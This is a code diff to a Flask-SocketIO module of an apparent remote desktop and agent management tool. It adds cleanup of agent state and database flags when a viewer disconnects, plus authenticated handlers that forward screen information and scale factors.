@@ -1,4 +1,4 @@
-﻿from flask_login import current_user
+from flask_login import current_user
 from flask_socketio import SocketIO, join_room, leave_room, emit
 from glycon.config import CONFIG
 import sqlite3
@@ -405,10 +405,22 @@ def init_socket_handlers(socketio):
         connection_count -= 1
         print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")
 
-        # Emit stop_screenshots to all agents when remote desktop disconnects
-        for agent_id in remote_desktop_active_agents:
-            emit('stop_screenshots', {}, room=f"agent_{agent_id}", namespace='/remote_desktop')
-            print(f"[SocketIO] Sent stop_screenshots to agent {agent_id}")
+        # Clean up all agent connections
+        for agent_id in list(remote_desktop_active_agents.keys()):
+            try:
+                emit('stop_screenshots', {}, room=f"agent_{agent_id}", namespace='/remote_desktop')
+                remote_desktop_active_agents.pop(agent_id, None)
+                
+                # Update database
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
+                conn.commit()
+                conn.close()
+                
+                print(f"[SocketIO] Cleaned up agent {agent_id} on remote desktop disconnect")
+            except Exception as e:
+                print(f"[SocketIO] Error cleaning up agent {agent_id}: {str(e)}")
 
     @socketio.on('agent_connect', namespace='/remote_desktop')
     def handle_remote_desktop_agent_connect(data):
@@ -609,3 +621,24 @@ def init_socket_handlers(socketio):
                 'keyCode': keyCode,
                 'agent_id': agent_id
             }, room=f"agent_{agent_id}", namespace='/remote_desktop')
+
+    # Add screen info and scale factors handlers
+    @socketio.on('screen_info', namespace='/remote_desktop')
+    def handle_screen_info(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            if not agent_id:
+                print("[SocketIO] screen_info event missing agent_id")
+                return
+            print(f"[SocketIO] Forwarding screen info from agent {agent_id}")
+            emit('screen_info', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')
+
+    @socketio.on('scale_factors', namespace='/remote_desktop')
+    def handle_scale_factors(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            if not agent_id:
+                print("[SocketIO] scale_factors event missing agent_id")
+                return
+            print(f"[SocketIO] Forwarding scale factors from agent {agent_id}")
+            emit('scale_factors', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')
